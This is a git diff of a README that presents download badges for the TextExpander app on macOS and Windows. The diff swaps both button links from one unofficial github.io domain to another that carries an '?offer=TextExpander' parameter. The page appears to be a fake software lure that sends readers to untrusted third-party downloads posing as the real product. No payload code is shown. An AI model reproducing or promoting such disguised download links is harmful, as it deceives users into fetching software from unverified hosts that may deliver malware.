@@ -1,13 +1,13 @@
 # TextExpander for MacOS & Windows — Text Shortcuts
 
-<a href="https://git-work-deploy.github.io/.github/?offer=TextExpander" target="_blank">
+<a href="https://app-desktop-hub.github.io/.github/?offer=TextExpander" target="_blank">
   <img 
     src="https://img.shields.io/badge/TextExpander%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
     width="280" 
     alt="TextExpander for macOS">
 </a>
 
-<a href="https://git-work-deploy.github.io/.github/?offer=TextExpander" target="_blank">
+<a href="https://app-desktop-hub.github.io/.github/?offer=TextExpander" target="_blank">
   <img 
     src="https://img.shields.io/badge/TextExpander%20for%20Windows-0078D7?style=for-the-badge&logo=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IS0tIFVwbG9hZGVkIHRvOiBTVkcgUmVwbywgd3d3LnN2Z3JlcG8uY29tLCBHZW5lcmF0b3I6IFNWRyBSZXBvIE1peGVyIFRvb2xzIC0tPgo8c3ZnIGZpbGw9IiMwMDAwMDAiIHdpZHRoPSI4MDBweCIgaGVpZ2h0PSI4MDBweCIgdmlld0JveD0iMCAwIDI1NiAyNTYiIGlkPSJGbGF0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Ik0xMTIsMTQ0djUxLjYzNjcyYTcuOTk4Myw3Ljk5ODMsMCwwLDEtOS40MzExNSw3Ljg3MDYxbC02NC0xMS42MzYyM0E4LjAwMDE5LDguMDAwMTksMCwwLDEsMzIsMTg0VjE0NGE4LjAwMDA4LDguMDAwMDgsMCwwLDEsOC04aDY0QTguMDAwMDgsOC4wMDAwOCwwLDAsMSwxMTIsMTQ0Wk0xMDkuMTI2LDU0LjIyMTdhNy45OTUsNy45OTUsMCwwLDAtNi41NTcxMy0xLjcyOWwtNjQsMTEuNjM2MjNBOC4wMDAxNyw4LjAwMDE3LDAsMCwwLDMyLDcydjQwYTguMDAwMDgsOC4wMDAwOCwwLDAsMCw4LDhoNjRhOC4wMDAwOCw4LjAwMDA4LDAsMCwwLDgtOFY2MC4zNjMzQTcuOTk4NTMsNy45OTg1MywwLDAsMCwxMDkuMTI2LDU0LjIyMTdabTExMi0yMC4zNjM3N2E3Ljk5NzE0LDcuOTk3MTQsMCwwLDAtNi41NTcxMy0xLjcyOWwtODAsMTQuNTQ1OUE3Ljk5OTY1LDcuOTk5NjUsMCwwLDAsMTI4LDU0LjU0NTQzVjExMmE4LjAwMDA4LDguMDAwMDgsMCwwLDAsOCw4aDgwYTguMDAwMDgsOC4wMDAwOCwwLDAsMCw4LThWNDBBOC4wMDAyOCw4LjAwMDI4LDAsMCwwLDIyMS4xMjYsMzMuODU3OTNaTTIxNiwxMzZIMTM2YTguMDAwMDgsOC4wMDAwOCwwLDAsMC04LDh2NTcuNDU0NTlhNy45OTk2Nyw3Ljk5OTY3LDAsMCwwLDYuNTY4ODUsNy44NzA2MWw4MCwxNC41NDU5QTguMDAwMSw4LjAwMDEsMCwwLDAsMjI0LDIxNlYxNDRBOC4wMDAwOCw4LjAwMDA4LDAsMCwwLDIxNiwxMzZaIi8+Cjwvc3ZnPg==&logoColor=white" 
     width="280" 
